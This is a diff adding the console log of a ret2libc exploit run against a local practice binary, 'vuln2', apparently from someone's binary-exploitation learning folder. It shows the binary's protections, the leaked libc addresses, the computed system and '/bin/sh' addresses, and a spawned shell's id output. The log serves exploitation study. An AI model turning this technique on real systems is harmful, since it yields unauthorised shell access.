@@ -1,0 +1,19 @@
+[*] '/mnt/d/逆向/逆向学习/practice/pwn-practice/02-ret2libc/vuln2'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[x] Starting local process './vuln2'
+[+] Starting local process './vuln2': pid 55
+[+] leaked puts@libc = 0x7839fc287cc0
+[+] libc base       = 0x7839fc200000
+[+] system@libc     = 0x7839fc258750
+[+] "/bin/sh"@libc  = 0x7839fc3cc42f
+you said: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa@
+uid=1001(lzq) gid=1002(lzq) groups=1002(lzq),27(sudo)
+===RET2LIBC_SHELL_WORKS===
+[*] Stopped process './vuln2' (pid 55)
